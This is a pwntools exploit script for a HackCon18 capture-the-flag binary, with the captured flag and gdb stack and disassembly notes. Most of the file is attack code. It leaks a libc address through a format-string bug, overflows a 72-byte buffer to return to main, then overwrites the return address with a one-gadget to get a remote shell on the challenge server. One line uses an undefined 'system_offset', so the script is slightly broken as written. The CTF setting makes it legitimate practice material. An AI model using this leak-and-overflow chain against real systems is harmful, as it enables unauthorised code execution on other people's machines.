#! /usr/bin/python

from pwn import *

'''
pwnlib.args.SILENT(True)
def leak(): 
    for i in range(500):
        s = process('./main') 
        s.recvline()
        s.recvline()
        s.sendline('AAAA.%{}$p'.format(i))
        print '{} -> {}'.format(i, s.recvline())
        s.close()

leak()
'''
#s = process('./main', env={'LD_PRELOAD':'./libc-2.19.so'})
# nc 139.59.30.165 9200
s = remote('139.59.30.165', 9200)
#s = process('./main')

libc = ELF('./libc-2.19.so')
__libc_start_main_offset = libc.symbols['__libc_start_main']
log.info('__libc_start_main_offset = ' + hex(__libc_start_main_offset))  # __libc_start_main_offset = 0x21e50

s.recvline()
s.recvline()

padding = 72
main_addr = 0x400637

# payload = '%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p'  
# 1:  0x7f311a1779f0
# 17: 0x7f3119dd4f45 libc_start_main
# 0x7f311a1779f0 - 0x7f3119dd4f45 = 0x3A2AAB
# libc_addr = 0x7f311a1779f0 - 0x3A2AAB - 245 - 0x21e50 = 0x7f311a1779f0 - 0x3C49F0

payload = '%1$p' + 'A' * (padding - 4) + p64(main_addr)

s.sendline(payload)

leak = int(s.recvline()[:14:],16)
libc_addr = leak - 0x3C49F0
system = libc_addr + system_offset
oneshot = libc_addr + 0x46428 

log.info('leak = {}'.format(hex(leak)))
log.info('libc_addr = {}'.format(hex(libc_addr)))
log.info('oneshot = {}'.format(hex(oneshot)))

s.recvline()
s.recvline()

'''
context.terminal = ["terminator", "-e"]
gdb.attach(s, """
b * 0x4006c0
""")
'''

payload = 'A' * padding + p64(oneshot)

s.sendline(payload)

s.interactive()
# d4rk{r0p_ch41n1n6_15_5up3r_fun_0n_64_b17_5y573m}c0de


'''
[-------------------------------------code-------------------------------------]
   0x4006b6 <main+127>:	call   0x400530 <fflush@plt>
   0x4006bb <main+132>:	mov    eax,0x0
   0x4006c0 <main+137>:	leave  
=> 0x4006c1 <main+138>:	ret    
   0x4006c2:	xor    rdi,rbp
   0x4006c5:	ret    
   0x4006c6:	nop    WORD PTR cs:[rax+rax*1+0x0]
   0x4006d0 <__libc_csu_init>:	push   r15
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdb28 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)   <----------------------------- !!!
0008| 0x7fffffffdb30 --> 0x1 
0016| 0x7fffffffdb38 --> 0x7fffffffdc08 --> 0x7fffffffdffc ("/home/osboxes/Desktop/HackCon18/Simpe Yet Elegent/main")
0024| 0x7fffffffdb40 --> 0x1f7ffcca0 
0032| 0x7fffffffdb48 --> 0x400637 (<main>:	push   rbp)
0040| 0x7fffffffdb50 --> 0x0 
0048| 0x7fffffffdb58 --> 0x22a98ad3f261030b 
0056| 0x7fffffffdb60 --> 0x400550 (<_start>:	xor    ebp,ebp)
[------------------------------------------------------------------------------]

>gdb ./libc-2.19.so
>gdb-peda$ disass __libc_start_main
Dump of assembler code for function __libc_start_main:
   0x0000000000021e50 <+0>:	push   r14
   0x0000000000021e52 <+2>:	push   r13
   [...]
   0x0000000000021f43 <+243>:	call   rax
   0x0000000000021f45 <+245>:	mov    edi,eax             <------------------------------- !!! => +245 in given libc-2.19.so
   0x0000000000021f47 <+247>:	call   0x3c1e0 <exit>

'''








